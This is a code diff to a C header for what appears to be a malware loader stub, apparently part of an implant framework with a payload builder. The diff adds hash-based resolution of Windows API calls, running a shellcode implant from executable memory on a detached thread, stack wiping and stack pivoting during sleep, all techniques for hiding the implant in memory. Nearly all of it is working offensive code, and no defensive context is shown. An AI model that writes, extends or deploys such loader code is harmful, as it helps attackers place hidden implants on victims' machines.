@@ -52,7 +52,9 @@ typedef WCHAR*              PWCHAR;
 
 #define MEM_COMMIT           0x00001000
 #define MEM_RESERVE          0x00002000
+#define PAGE_READWRITE       0x04
 #define PAGE_EXECUTE_READWRITE 0x40
+#define INFINITE             0xFFFFFFFF
 
 /* ------------------------------------------------------------------ */
 /*  DJB2 hashes (pre-computed, case-insensitive)                       */
@@ -63,6 +65,11 @@ typedef WCHAR*              PWCHAR;
 #define HASH_KERNEL32_DLL   0x7040EE75  /* "kernel32.dll" (from specter.h) */
 /* VirtualAlloc hash -- regenerate with compute_hashes.py if needed */
 #define HASH_VIRTUALALLOC   0x58DACBD7  /* "VirtualAlloc" */
+#define HASH_CREATETHREAD   0xE819B491  /* "CreateThread" */
+#define HASH_CLOSEHANDLE    0x2EAC8647  /* "CloseHandle" */
+#define HASH_SLEEP          0x105CF61E  /* "Sleep" */
+#define HASH_EXITTHREAD     0x46C28C97  /* "ExitThread" */
+#define HASH_LOADLIBRARYA   0x0666395B  /* "LoadLibraryA" */
 
 /* ------------------------------------------------------------------ */
 /*  PE structures (minimal for export parsing)                         */
@@ -166,6 +173,17 @@ typedef struct _IMAGE_EXPORT_DIRECTORY {
 
 typedef PVOID (__attribute__((ms_abi)) *fn_VirtualAlloc)(
     PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef HANDLE (__attribute__((ms_abi)) *fn_CreateThread)(
+    PVOID lpThreadAttributes,
+    SIZE_T dwStackSize,
+    PVOID lpStartAddress,
+    PVOID lpParameter,
+    DWORD dwCreationFlags,
+    PDWORD lpThreadId);
+typedef BOOL (__attribute__((ms_abi)) *fn_CloseHandle)(HANDLE hObject);
+typedef void (__attribute__((ms_abi)) *fn_Sleep)(DWORD dwMilliseconds);
+typedef void (__attribute__((ms_abi)) *fn_ExitThread)(DWORD dwExitCode);
+typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *lpLibFileName);
 
 /* ------------------------------------------------------------------ */
 /*  Inline helpers                                                     */
@@ -305,6 +323,21 @@ static inline fn_VirtualAlloc stub_resolve_virtualalloc(void) {
     return (fn_VirtualAlloc)stub_find_export(k32, HASH_VIRTUALALLOC);
 }
 
+static inline PVOID stub_resolve_kernel32_export(DWORD hash) {
+    PVOID k32 = stub_find_module(HASH_KERNEL32_DLL);
+    if (!k32)
+        return NULL;
+    return stub_find_export(k32, hash);
+}
+
+static inline PVOID stub_load_library(const char *name) {
+    fn_LoadLibraryA pLoadLibrary =
+        (fn_LoadLibraryA)stub_resolve_kernel32_export(HASH_LOADLIBRARYA);
+    if (!pLoadLibrary)
+        return NULL;
+    return pLoadLibrary(name);
+}
+
 /* ------------------------------------------------------------------ */
 /*  Marker definitions (must match PayloadBuilder in mod.rs)           */
 /*                                                                     */
@@ -395,8 +428,15 @@ typedef void (__attribute__((ms_abi)) *fn_ExitProcess_stub)(DWORD code);
 /* Global so WinMainCRTStartup can read it after stub_execute_payload returns */
 static DWORD g_stub_exit_code = 0;
 
-static inline void stub_execute_payload(void) {
-    #define STUB_FAIL(code) do { g_stub_exit_code = (code); return; } while(0)
+static DWORD __attribute__((ms_abi)) stub_payload_thread_main(PVOID param) {
+    fn_implant_entry entry = (fn_implant_entry)param;
+    if (entry)
+        entry(NULL);
+    return 0;
+}
+
+static inline fn_implant_entry stub_prepare_payload_entry(void) {
+    #define STUB_FAIL(code) do { g_stub_exit_code = (code); return NULL; } while(0)
 
     /* Step 1: Resolve VirtualAlloc */
     fn_VirtualAlloc pVirtualAlloc = stub_resolve_virtualalloc();
@@ -455,10 +495,143 @@ static inline void stub_execute_payload(void) {
     stub_memcpy(config_dst + sizeof(DWORD), config_blob, config_len);
 
     /* Step 8: Jump to PIC entry point at the builder-patched offset */
-    fn_implant_entry entry = (fn_implant_entry)((PBYTE)exec_mem + pic_entry_off);
-    entry(NULL);
+    return (fn_implant_entry)((PBYTE)exec_mem + pic_entry_off);
 
     #undef STUB_FAIL
+}
+
+static inline void stub_execute_payload(void) {
+    fn_implant_entry entry = stub_prepare_payload_entry();
+    if (!entry)
+        return;
+    entry(NULL);
+}
+
+static inline BOOL stub_start_payload_detached(void) {
+    fn_implant_entry entry = stub_prepare_payload_entry();
+    if (!entry)
+        return FALSE;
+
+    fn_CreateThread pCreateThread =
+        (fn_CreateThread)stub_resolve_kernel32_export(HASH_CREATETHREAD);
+    fn_CloseHandle pCloseHandle =
+        (fn_CloseHandle)stub_resolve_kernel32_export(HASH_CLOSEHANDLE);
+
+    if (!pCreateThread || !pCloseHandle) {
+        entry(NULL);
+        return TRUE;
+    }
+
+    HANDLE thread = pCreateThread(
+        NULL, 0, (PVOID)stub_payload_thread_main, (PVOID)entry, 0, NULL);
+    if (!thread) {
+        entry(NULL);
+        return TRUE;
+    }
+
+    entry = NULL;
+    pCloseHandle(thread);
+    return TRUE;
+}
+
+static inline void stub_scrub_stack(void) {
+    volatile BYTE scratch[8192];
+    for (SIZE_T i = 0; i < sizeof(scratch); i++)
+        scratch[i] = 0;
+}
+
+static inline void stub_execute_payload_detached_hold(DWORD hold_ms) {
+    if (!stub_start_payload_detached())
+        return;
+
+    fn_Sleep pSleep = (fn_Sleep)stub_resolve_kernel32_export(HASH_SLEEP);
+    if (!pSleep)
+        return;
+
+    stub_scrub_stack();
+    pSleep(hold_ms);
+}
+
+static inline void stub_tail_sleep(DWORD hold_ms) {
+    fn_Sleep pSleep = (fn_Sleep)stub_resolve_kernel32_export(HASH_SLEEP);
+    if (!pSleep)
+        return;
+
+    __asm__ volatile (
+        "mov rax, %0\n"
+        "mov ecx, %1\n"
+        "mov rdx, rsp\n"
+        "mov r8, 0x4000\n"
+        "xor r9d, r9d\n"
+        "1:\n"
+        "mov qword ptr [rdx], r9\n"
+        "add rdx, 8\n"
+        "sub r8, 8\n"
+        "jnz 1b\n"
+        "jmp rax\n"
+        :
+        : "r"(pSleep), "r"(hold_ms)
+        : "rax", "rcx", "rdx", "r8", "r9", "memory"
+    );
+}
+
+static inline void stub_pivot_sleep(DWORD hold_ms) {
+    fn_VirtualAlloc pVirtualAlloc = stub_resolve_virtualalloc();
+    fn_Sleep pSleep = (fn_Sleep)stub_resolve_kernel32_export(HASH_SLEEP);
+    if (!pVirtualAlloc || !pSleep)
+        return;
+
+    PBYTE stack = (PBYTE)pVirtualAlloc(
+        NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stack)
+        return;
+
+    PBYTE stack_top = stack + 0xF000;
+    __asm__ volatile (
+        "mov rax, %0\n"
+        "mov ecx, %1\n"
+        "mov rsp, %2\n"
+        "and rsp, -16\n"
+        "sub rsp, 0x28\n"
+        "1:\n"
+        "call rax\n"
+        "jmp 1b\n"
+        :
+        : "r"(pSleep), "r"(hold_ms), "r"(stack_top)
+        : "rax", "rcx", "memory"
+    );
+}
+
+static inline void stub_execute_payload_detached_pivot_hold(DWORD hold_ms) {
+    if (stub_start_payload_detached())
+        stub_pivot_sleep(hold_ms);
+    stub_execute_payload_detached_hold(hold_ms);
+}
+
+static inline BOOL stub_start_sleep_thread(DWORD hold_ms) {
+    fn_CreateThread pCreateThread =
+        (fn_CreateThread)stub_resolve_kernel32_export(HASH_CREATETHREAD);
+    fn_CloseHandle pCloseHandle =
+        (fn_CloseHandle)stub_resolve_kernel32_export(HASH_CLOSEHANDLE);
+    fn_Sleep pSleep = (fn_Sleep)stub_resolve_kernel32_export(HASH_SLEEP);
+
+    if (!pCreateThread || !pCloseHandle || !pSleep)
+        return FALSE;
+
+    HANDLE thread = pCreateThread(
+        NULL, 0, (PVOID)pSleep, (PVOID)(ULONG_PTR)hold_ms, 0, NULL);
+    if (!thread)
+        return FALSE;
+
+    pCloseHandle(thread);
+    return TRUE;
+}
+
+static inline void stub_exit_thread(DWORD code) {
+    fn_ExitThread pExitThread =
+        (fn_ExitThread)stub_resolve_kernel32_export(HASH_EXITTHREAD);
+    if (pExitThread)
+        pExitThread(code);
 }
 
 #endif /* STUB_COMMON_H */
